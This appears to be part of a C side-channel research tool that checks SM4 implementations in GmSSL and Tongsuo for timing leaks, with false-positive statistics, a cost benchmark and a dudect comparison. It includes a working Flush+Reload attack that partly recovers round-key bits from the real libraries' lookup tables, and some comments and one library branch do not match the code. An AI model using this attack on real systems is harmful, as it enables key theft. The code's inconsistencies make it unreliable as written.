
/* ------------------------------------------------------------------ 假阳性评估（W12）
 *
 * 讨论的问题：工具会不会把"干净实现"判成泄漏？
 * 做法：拿 6 个真值已知的实现（3 个该判泄漏、3 个该判干净），每个重复 R 次，
 *       统计"多少轮越过阈值"。干净实现的过阈值率就是假阳性率。
 */
static uint64_t our_tt_fn(const void* k, int cls)     { return measure_once(sm4_tt,     (const sm4_key*)k, cls); }
static uint64_t our_ct_fn(const void* k, int cls)     { return measure_once(sm4_ct,     (const sm4_key*)k, cls); }
static uint64_t our_ctrev_fn(const void* k, int cls)  { return measure_once(sm4_ct_rev, (const sm4_key*)k, cls); }

/* 干净基线：一个完全不碰数据的地址依赖的计算循环。
 * 访存地址只由循环下标决定，理论上不该有泄漏；用来验证工具不会凭空造出泄漏。 */
static uint32_t g_null_rk[32];
static uint64_t measure_null(const void* unused, int cls) {
    (void)unused;
    uint8_t in[16];
    gen_input(in, cls);

    fence_all();
    uint64_t t0 = now_cycles();
    uint32_t acc = 0;
    for (int i = 0; i < 2048; i++) {        /* 固定次数，地址与数据无关；工作量放大到与 SM4 同量级 */
        uint32_t v = g_null_rk[i & 31];
        acc += v ^ (uint32_t)in[i & 15];
        acc = (acc << 3) | (acc >> 29);
    }
    fence_all();
    uint64_t t1 = now_cycles();
    g_sink ^= acc;
    return t1 - t0;
}
static uint64_t null_fn(const void* k, int cls) { return measure_null(k, cls); }

typedef struct {
    const char* name;
    uint64_t (*fn)(const void*, int);
    const void* key;
    int ground_truth_leaky;   /* 1 = 应当判泄漏 */
} variant_desc;

static int cmd_sweep(int reps, int n) {
    static const uint8_t K[16] = {0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10};

    sm4_tables_alloc(4);
    sm4_key kours;      sm4_set_enc_key(K, &kours);
    gmssl_sm4_key ktt;  sm4_set_encrypt_key(&ktt, K);
    gmssl_small_key ksm; gmssl_small_set_encrypt_key(&ksm, K);
    tongsuo_sm4_key kts; ossl_sm4_set_key(K, &kts);
    for (int i = 0; i < 32; i++) g_null_rk[i] = (uint32_t)(0x9E3779B9u * (unsigned)(i + 1));

    variant_desc vs[] = {
        { "our T-table",        our_tt_fn,    &kours, 1 },
        { "GmSSL T-table",      tt_fn,        &ktt,   1 },
        { "GmSSL small-table",  small_fn,     &ksm,   1 },
        { "Tongsuo(pristine)", tongsuo_pristine_fn, &kts, 1 },   /* 表为 static，外部无法 flush */
        { "our const-time",     our_ct_fn,    &kours, 0 },
        { "our const-time rev", our_ctrev_fn, &kours, 0 },
        { "null baseline",      null_fn,      NULL,   0 },
    };
    const int nv = (int)(sizeof(vs) / sizeof(vs[0]));

    printf("=== 对照组与判别能力评估：%d 个真值已知的实现，每个重复 %d 轮（每类 %d 样本）===\n", nv, reps, n);
    printf("    说明：无法 flush 其表的实现（Tongsuo pristine）记为 NOT-DETECTED，属测量盲区，不计入灵敏度\n\n");
    printf("%-22s %10s %10s %10s %s\n", "实现", "过阈值轮数", "max |t|", "中位 |t|", "结论");

    int tp = 0, tp_run = 0, tn = 0, tn_run = 0, blind_runs = 0;
    for (int i = 0; i < nv; i++) {
        double ts[64];
        int over = 0;
        if (reps > 64) reps = 64;
        for (int r = 0; r < reps; r++) {
            stat_t sa, sb;
            ts[r] = fabs(ttest_raw(vs[i].fn, vs[i].key, n, &sa, &sb));
            if (ts[r] > 4.5) over++;
        }
        /* 中位数 */
        double sorted[64];
        memcpy(sorted, ts, sizeof(double) * (size_t)reps);
        for (int a = 0; a < reps; a++)
            for (int b = a + 1; b < reps; b++)
                if (sorted[b] < sorted[a]) { double tmp = sorted[a]; sorted[a] = sorted[b]; sorted[b] = tmp; }
        double med = sorted[reps / 2];
        double mx = sorted[reps - 1];

        int judged_leaky = (over * 2 > reps);   /* 过半越阈值才判泄漏 */
        int correct = (judged_leaky == vs[i].ground_truth_leaky);
        /* 无法 flush 的实现：没测到不等于安全，也不计入灵敏度统计 */
        int blind = (!judged_leaky && vs[i].ground_truth_leaky && vs[i].key == &kts);
        const char* tag = correct ? "OK" : (blind ? "NOT-DETECTED(blind)" : "MISCLASSIFIED");
        printf("%-22s %6d/%-3d %10.1f %10.1f  %s\n", vs[i].name, over, reps, mx, med, tag);
        if (blind) { blind_runs += reps; continue; }

        if (vs[i].ground_truth_leaky) { tp++; tp_run += over; }
        else                          { tn++; tn_run += over; }
    }

    double fpr = tn_run ? (100.0 * tn_run / (double)(tn * reps)) : 0.0;
    int tp_runs_total = tp * reps;
    double tpr = tp_runs_total ? (100.0 * tp_run / (double)tp_runs_total) : 0.0;
    printf("\n  真值：%d 个应判泄漏，%d 个应判干净", tp, tn);
    if (blind_runs) printf("，%d 轮属测量盲区（不计入）", blind_runs);
    printf("\n");
    printf("  灵敏度（泄漏实现被正确判泄漏的轮次占比）: %.1f%%\n", tpr);
    printf("  假阳性（干净实现被判泄漏的轮次占比）: %.1f%%\n", fpr);
    printf("  说明：单轮 |t| 越过阈值不等于误判——判据是「重复 %d 轮里过半越过」。\n", reps);
    printf("        未检出的实测实现若因无法 flush 其表，记为盲区而非能力缺陷。\n");
    return 0;
}


/* ------------------------------------------------------------------ 真实库：部分密钥恢复
 *
 * 目标：在 GmSSL 的真实布局（4 KB T-table，16 项/缓存行）上做**部分**信息恢复。
 *
 * 为什么只能到"部分"：
 *   一行 64 字节装 16 个 4 字节表项，观测到的只是"落在哪一行"。
 *   同一行的 16 个候选完全不可区分 → 每个字节最多得到高 4 bit。
 *
 * 为什么仍然不是零信息（这是关键）：
 *   目标轮访问的那一行必然在命中集合里：      P(hit | 正确候选) ≈ 1
 *   错误候选对应另一行，被剩余 31 轮碰到的概率：P(hit | 错误候选) = 1-(15/16)^31 ≈ 86.5%
 *   于是"预测行是否命中"就构成一个判别器：正确候选组接近 100%，其余约 86.5%。
 */
#define REAL_LINES_PER_TABLE (1024 / 64)   /* 每张表 1024 字节 = 16 条缓存行 */

/* 当前被攻击的实现：表指针与加密函数必须配套 */
static const uint32_t* g_rt[4] = { 0, 0, 0, 0 };
static void (*g_real_encrypt)(const void* ks, const uint8_t* in, uint8_t* out) = 0;

static void gmssl_real_encrypt(const void* ks, const uint8_t* in, uint8_t* out) {
    sm4_encrypt((const gmssl_sm4_key*)ks, in, out);
}
static void tongsuo_real_encrypt(const void* ks, const uint8_t* in, uint8_t* out) {
    ossl_sm4_encrypt(in, out, ks);
}

static int cmp_int_desc(const void* a, const void* b) {
    int x = *(const int*)a, y = *(const int*)b;
    return (y > x) - (y < x);
}

static int cmd_attack_real(const char* lib, int traces) {
    static const uint8_t K[16] = {0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10};
    gmssl_sm4_key k;
    gmssl_small_key ksm2;
    tongsuo_sm4_key kts;
    uint32_t true_rk0 = 0;

    if (!strcmp(lib, "tongsuo")) {
        ossl_sm4_set_key(K, &kts);
        g_rt[0] = SM4_SBOX_T0; g_rt[1] = SM4_SBOX_T1; g_rt[2] = SM4_SBOX_T2; g_rt[3] = SM4_SBOX_T3;
        g_real_encrypt = tongsuo_real_encrypt;
        true_rk0 = ((const tongsuo_sm4_key*)&kts)->rk[0];
        printf("=== Tongsuo 官方实现（4 KB T-table，16 项/缓存行）===\n");
    } else {
        sm4_set_encrypt_key(&k, K);
        g_rt[0] = T0; g_rt[1] = T1; g_rt[2] = T2; g_rt[3] = T3;
        g_real_encrypt = gmssl_real_encrypt;
        true_rk0 = k.rk[0];
        printf("=== GmSSL 官方实现（4 KB T-table，16 项/缓存行）===\n");
    }
    (void)ksm2;

    /* 标定函数用的是自研表的地址；这里必须先分配，否则拿 NULL 去 clflush */
    if (sm4_tables_alloc(4) != 0) { printf("alloc failed\n"); return 1; }
    calibrate_threshold();

    /* 表起点不一定 64 字节对齐，行号必须按实际偏移算 */
    size_t off[4], lines_of[4], total = 0;
    for (int t4 = 0; t4 < 4; t4++) {
        off[t4] = ((uintptr_t)g_rt[t4]) % 64;
        lines_of[t4] = (off[t4] + 256 * sizeof(uint32_t) + 63) / 64;
        total += lines_of[t4];
    }
    uint8_t* hit = (uint8_t*)malloc(total);
    uint8_t (*pts)[16] = (uint8_t(*)[16])malloc((size_t)traces * 16);
    if (!hit || !pts) { printf("oom\n"); return 1; }

    /* 乱序探测，避免预取器造成假命中 */
    size_t* order = (size_t*)malloc(total * sizeof(size_t));
    for (size_t i = 0; i < total; i++) order[i] = i;
    for (size_t i = total; i > 1; i--) {
        size_t j = (size_t)(rng() % (uint32_t)i);
        size_t t = order[i-1]; order[i-1] = order[j]; order[j] = t;
    }

    printf("  trace 数：%d　目标：恢复 rk[0] 每个字节的**高 4 bit**（行号）\n", traces);

    /* 累计得分：4 个字节 × 256 个候选 */
    static int score[4][256];
    memset(score, 0, sizeof(score));

    uint8_t out[16];
    for (int n = 0; n < traces; n++) {
        for (int i = 0; i < 16; i += 4) { uint32_t r = rng(); memcpy(pts[n] + i, &r, 4); }

        for (int t3 = 0; t3 < 4; t3++) flush_block((void*)g_rt[t3], sizeof(uint32_t) * 256);

        g_real_encrypt(&k, pts[n], out);
        g_sink ^= out[0];

        for (size_t t2 = 0; t2 < total; t2++) {
            size_t idx = order[t2];
            /* 展开全局下标 → (表, 行) */
            int tab = 0;
            size_t line = idx;
            while (line >= lines_of[tab]) { line -= lines_of[tab]; tab++; }
            const volatile char* p =
                (const volatile char*)((const char*)g_rt[tab] - off[tab] + line * 64);
            fence_all();
            uint64_t c0 = now_cycles();
            volatile char v = *p;
            fence_all();
            uint64_t c1 = now_cycles();
            (void)v;
            hit[idx] = ((c1 - c0) <= g_threshold_hit) ? 1 : 0;
        }

        /* 第 0 轮：t = X1 ^ X2 ^ X3（明文已知，轮密钥未知） */
        uint32_t w[4];
        for (int ww = 0; ww < 4; ww++)
            w[ww] = ((uint32_t)pts[n][ww*4] << 24) | ((uint32_t)pts[n][ww*4+1] << 16) |
                    ((uint32_t)pts[n][ww*4+2] << 8) | (uint32_t)pts[n][ww*4+3];
        uint32_t t = w[1] ^ w[2] ^ w[3];

        for (int j = 0; j < 4; j++) {
            uint8_t tb = (uint8_t)(t >> (24 - 8 * j));
            size_t base_global = 0;
            for (int t5 = 0; t5 < j; t5++) base_global += lines_of[t5];
            for (int g = 0; g < 256; g++) {
                size_t line = (off[j] + (size_t)(tb ^ (uint8_t)g) * 4) / 64;
                if (line >= lines_of[j]) line = lines_of[j] - 1;
                score[j][g] += hit[base_global + line];
            }
        }
    }

    /* 统计结果 */
    const uint32_t true_rk = true_rk0;
    int total_hit_lines_correct = 0, total_guesses = 0, total_ambig = 0;
    printf("\n  %-6s %-10s %-28s %-10s %s\n", "字节", "真实高4位", "得分最高的 16 个候选(高4位)", "正确组得分", "其余组均值");
    for (int j = 0; j < 4; j++) {
        uint8_t true_byte = (uint8_t)(true_rk >> (24 - 8 * j));
        int true_hi = true_byte >> 4;

        /* 按组统计：同一个高 4 bit 的 16 个候选得分相同 */
        int group_score[16];
        for (int hi = 0; hi < 16; hi++) group_score[hi] = score[j][hi << 4];

        int sorted[16];
        memcpy(sorted, group_score, sizeof(sorted));
        qsort(sorted, 16, sizeof(int), cmp_int_desc);
        int best = sorted[0], second = sorted[1];

        int hi_best = 0;
        for (int hi = 0; hi < 16; hi++) if (group_score[hi] == best) { hi_best = hi; break; }

        int sum_other = 0;
        for (int hi = 0; hi < 16; hi++) if (hi != true_hi) sum_other += group_score[hi];

        printf("  b%-5d 0x%-8x 最高组=0x%-2x (%d/%d)        %-10.1f %.1f\n",
               j, true_hi, hi_best, best, traces,
               (double)group_score[true_hi], (double)sum_other / 15.0);

        /* 边际判定：最高组与次高组差距太小时，不猜——标为歧义。
         * 这是"宁可说不知道，也不给错误答案"的工程选择。 */
        double margin = (double)(best - second) / (double)traces;
        int ambiguous = (margin < 0.01);
        if (ambiguous) total_ambig++;
        else if (hi_best == true_hi) total_hit_lines_correct++;
        total_guesses++;
        if (ambiguous) printf("            ↑ 边际仅 %.2f%%，标为歧义（不给出猜测）\n", margin * 100.0);
    }

    printf("\n  说明：同一缓存行内的 16 个候选得分完全相同（行粒度不可区分），\n");
    printf("        因此每个字节只能确定高 4 bit；低 4 bit 需要更细的观测通道。\n");
    printf("  结果：%d/%d 个字节判定成功", total_hit_lines_correct, total_guesses);
    if (total_ambig) printf("，%d 个歧义（边际不足 1%%，不给出猜测）", total_ambig);
    printf("。\n");

    free(hit); free(pts); free(order);
    /* 退出码只表示实验是否正常跑完；恢复成功与否写在输出里。
     * 若用退出码表示“没恢复出来”，报告链路会把一次合法的负结果当成故障。 */
    return 0;
}


/* ------------------------------------------------------------------ cost：修复的代价
 *
 * 只回答一个问题：把 T-table 换成常量时间实现，慢了多少钱？
 * 用同一套测量（每次 flush 后测单次加密周期）对比两种实现的均值。
 */
static int cmd_cost(int n) {
    static const uint8_t K[16] = {0xA1,0xB2,0xC3,0xD4,0xE5,0xF6,0x07,0x18,0x29,0x3A,0x4B,0x5C,0x6D,0x7E,0x8F,0x90};
    sm4_key k; sm4_set_enc_key(K, &k);
    sm4_tables_alloc(4);

    uint64_t sum_tt = 0, sum_ct = 0;
    for (int i = 0; i < n; i++) sum_tt += measure_once(sm4_tt, &k, i & 1);
    for (int i = 0; i < n; i++) sum_ct += measure_once(sm4_ct, &k, i & 1);

    double m_tt = (double)sum_tt / n, m_ct = (double)sum_ct / n;
    printf("=== 修复代价：T-table → 常量时间 ===\n");
    printf("  T-table     平均 %8.1f 周期/次\n", m_tt);
    printf("  常量时间版   平均 %8.1f 周期/次\n", m_ct);
    printf("  倍数 %.2fx（每类 %d 次，每次测量前 flush 全部表）\n", m_ct / m_tt, n);
    printf("  说明：这是纯软件常量时间化的代价；位切片实现通常比全表扫描便宜，但仍是数倍量级。\n");
    return 0;
}


/* ------------------------------------------------------------------ bench：与 dudect 方法同机对照
 *
 * dudect（Reparaz et al. 2017）与本工具的差异只在"统计预处理"：
 *   dudect：裁剪两端各 1%，阈值 |t| > 10，看累积 t
 *   本工具：裁剪两端各 5%，阈值 |t| > 4.5，重复 3 次取中位
 * 这里对**同一批样本**分别套两套预处理，用来观察结论对参数是否敏感。这是参数敏感性实验，不是 dudect；上游 dudect 的对照见 tests/dudect_harness.c。
 *
 * 注意：本实验只改预处理参数，与 dudect 的 102 个检验流程无关。
 */
static int cmp_double(const void* a, const void* b) {
    double x = *(const double*)a, y = *(const double*)b;
    return (x > y) - (x < y);
}

/* 对已排序样本做两端裁剪后求均值/方差 */
static void trimmed_stats(double* sorted, int n, double frac, double* mean, double* var) {
    int cut = (int)(n * frac);
    int lo = cut, hi = n - cut;
    if (hi - lo < 8) { lo = 0; hi = n; }
    double m = 0;
    for (int i = lo; i < hi; i++) m += sorted[i];
    m /= (double)(hi - lo);
    double v = 0;
    for (int i = lo; i < hi; i++) { double d = sorted[i] - m; v += d * d; }
    v /= (double)(hi - lo - 1 > 0 ? hi - lo - 1 : 1);
    *mean = m; *var = v;
}

static double welch_from(double* a, int na, double* b, int nb, double frac) {
    qsort(a, (size_t)na, sizeof(double), cmp_double);
    qsort(b, (size_t)nb, sizeof(double), cmp_double);
    double ma, va, mb, vb;
    trimmed_stats(a, na, frac, &ma, &va);
    trimmed_stats(b, nb, frac, &mb, &vb);
    double se = sqrt(va / (double)na + vb / (double)nb);
    if (se <= 0) return 0.0;
    return (ma - mb) / se;
}

static int cmd_bench(int n) {
    static const uint8_t K[16] = {0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10};
    sm4_tables_alloc(4);
    sm4_key kours;      sm4_set_enc_key(K, &kours);
    gmssl_sm4_key ktt;  sm4_set_encrypt_key(&ktt, K);
    tongsuo_sm4_key kts; ossl_sm4_set_key(K, &kts);

    struct { const char* name; uint64_t (*fn)(const void*, int); const void* key; } impls[] = {
        { "ours T-table", our_tt_fn, &kours },
        { "ours const-time", our_ct_fn, &kours },
        { "GmSSL", tt_fn, &ktt },
        { "Tongsuo-obs", tongsuo_fn, &kts },
    };

    double* a = (double*)malloc(sizeof(double) * (size_t)n);
    double* b = (double*)malloc(sizeof(double) * (size_t)n);
    if (!a || !b) { printf("oom\n"); return 1; }

    printf("=== 阈值与裁剪参数敏感性（同一批样本，两套预处理）===\n");
    printf("    本工具：裁剪 5%%、阈值 4.5、五次取中位\n");
    printf("    严口径：裁剪 1%%、阈值 10（更接近 dudect 的参数选择，但不是 dudect）\n");
    printf("    上游 dudect 的对照见 tests/dudect_harness.c\n\n");
    printf("%-18s %10s %10s %10s %10s  %s\n", "实现", "本工具|t|", "严口径|t|", "采集耗时ms", "判定一致", "结论");

    for (int i = 0; i < 4; i++) {
        double ts_ours[5], ts_dud[5], ms_all[5];
        for (int rep = 0; rep < 5; rep++) {   /* 三次取中位：单轮会被偶发中断拉偏 */
            uint64_t t0 = now_cycles();
            /* 必须交错采集：先跑完 A 组再跑 B 组会把"冷/热"顺序效应算成泄漏 */
            for (int j = 0; j < n; j++) {
                a[j] = (double)impls[i].fn(impls[i].key, 0);
                b[j] = (double)impls[i].fn(impls[i].key, 1);
            }
            uint64_t t1 = now_cycles();
            ts_ours[rep] = fabs(welch_from(a, n, b, n, 0.05));
            ts_dud[rep] = fabs(welch_from(a, n, b, n, 0.01));
            ms_all[rep] = (double)(t1 - t0) / 3.0e6;
        }
        qsort(ts_ours, 5, sizeof(double), cmp_double);
        qsort(ts_dud, 5, sizeof(double), cmp_double);
        qsort(ms_all, 5, sizeof(double), cmp_double);
        double t_ours = ts_ours[2], t_dud = ts_dud[2], ms = ms_all[2];
        int v_ours = t_ours > 4.5, v_dud = t_dud > 10.0;
        printf("%-18s %10.1f %10.1f %10.1f %10s  %s\n",
               impls[i].name, t_ours, t_dud, ms,
               (v_ours == v_dud) ? "一致" : "不一致",
               v_ours ? "LEAK" : "clean");
    }

    printf("\n  说明：两种判据在同一批样本上给出的结论应当一致；\n");
    printf("        差异通常出现在边缘实现上——dudect 的阈值更严（10 vs 4.5），裁剪更窄（1%% vs 5%%）。\n");
    free(a); free(b);
    return 0;
}

/* ------------------------------------------------------------------ main */



static void usage(void) {
    printf("hengshi - 面向国密实现的常量时间性检测与密钥泄漏定位\n\n");
    printf("用法:\n");
    printf("  hengshi verify                          SM4 标准测试向量自检\n");
    printf("  hengshi ttest [n]                       两类别 Welch t 检验（默认 n=20000）\n");
    printf("  hengshi converge                        sqrt(n) 收敛实验\n");
    printf("  hengshi real [n]                        实测 GmSSL 官方 SM4（默认 n=40000）\n");
    printf("  hengshi attack [stride] [traces] [rounds]   Flush+Reload 密钥恢复\n");
    printf("  hengshi compare [n]                     同库两种表布局对比（默认 n=40000）\n");
    printf("  hengshi libs [n] [reps]                 多库横向对比（GmSSL / Tongsuo）\n");
    printf("  hengshi sweep [reps] [n]                假阳性评估（默认 10 轮 / 20000 样本）\n");
    printf("  hengshi bench [n]                       与 dudect 方法的同机对照\n");
    printf("  hengshi cost [n]                        修复代价：常量时间化的性能开销\n");
    printf("  hengshi attack-real [lib] [traces]      真实库部分密钥恢复（lib=gmssl|tongsuo）\n");
    printf("  hengshi heat [stride] [file.csv]        导出单条 trace 的缓存行命中图\n");
    printf("  hengshi all                             依次跑 verify + ttest + converge + attack\n");
}

int main(int argc, char** argv) {
#if defined(_WIN32)
    SetConsoleOutputCP(CP_UTF8);
    /* 绑到 0 号核 + 高优先级：减少调度迁移和后台干扰，让 t 值可复现 */
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetThreadAffinityMask(GetCurrentThread(), (DWORD_PTR)1);
#endif
    if (argc < 2) { usage(); return 0; }
    const char* cmd = argv[1];

    if (!strcmp(cmd, "verify"))   return cmd_verify();
    if (!strcmp(cmd, "ttest")) {
        int n = (argc > 2) ? atoi(argv[2]) : 20000;
        if (n < 2000) n = 2000;
        return cmd_ttest(n);
    }
    if (!strcmp(cmd, "converge")) return cmd_converge();
    if (!strcmp(cmd, "real")) {
        int n = (argc > 2) ? atoi(argv[2]) : 40000;
        if (n < 2000) n = 2000;
        return cmd_real(n);
    }
    if (!strcmp(cmd, "attack")) {
        size_t stride = (argc > 2) ? (size_t)atoi(argv[2]) : 64;
        int traces    = (argc > 3) ? atoi(argv[3]) : 120;
        if (traces < 20) traces = 20;
        if (traces > 2000) traces = 2000;
        int rounds = (argc > 4) ? atoi(argv[4]) : 32;
        return cmd_attack(stride, traces, rounds);
    }
    if (!strcmp(cmd, "libs")) {
        int n = (argc > 2) ? atoi(argv[2]) : 40000;
        int reps = (argc > 3) ? atoi(argv[3]) : 3;
        if (n < 2000) n = 2000;
        if (reps < 1) reps = 1;
        return cmd_libs(n, reps);
    }
    if (!strcmp(cmd, "sweep")) {
        int reps = (argc > 2) ? atoi(argv[2]) : 10;
        int n    = (argc > 3) ? atoi(argv[3]) : 20000;
        if (reps < 3) reps = 3;
        if (n < 2000) n = 2000;
        return cmd_sweep(reps, n);
    }
    if (!strcmp(cmd, "compare")) {
        int n = (argc > 2) ? atoi(argv[2]) : 40000;
        if (n < 2000) n = 2000;
        return cmd_compare(n);
    }
    if (!strcmp(cmd, "bench")) {
        int nb = (argc > 2) ? atoi(argv[2]) : 20000;
        if (nb < 2000) nb = 2000;
        return cmd_bench(nb);
    }
    if (!strcmp(cmd, "cost")) {
        int n2 = (argc > 2) ? atoi(argv[2]) : 20000;
        if (n2 < 1000) n2 = 1000;
        return cmd_cost(n2);
    }
    if (!strcmp(cmd, "attack-real")) {
        const char* lib = (argc > 2) ? argv[2] : "gmssl";
        int traces = (argc > 3) ? atoi(argv[3]) : 1000;
        if (traces < 100) traces = 100;
        if (traces > 20000) traces = 20000;
        return cmd_attack_real(lib, traces);
    }
    if (!strcmp(cmd, "heat")) {
        size_t stride = (argc > 2) ? (size_t)atoi(argv[2]) : 64;
        const char* path = (argc > 3) ? argv[3] : "heat.csv";
        return cmd_heat(stride, path);
    }
    if (!strcmp(cmd, "all")) {
        int rc = cmd_verify();
        cmd_ttest(20000);
        cmd_converge();
        cmd_attack(64, 120, 32);
        return rc;
    }
    usage();
    return 1;
}
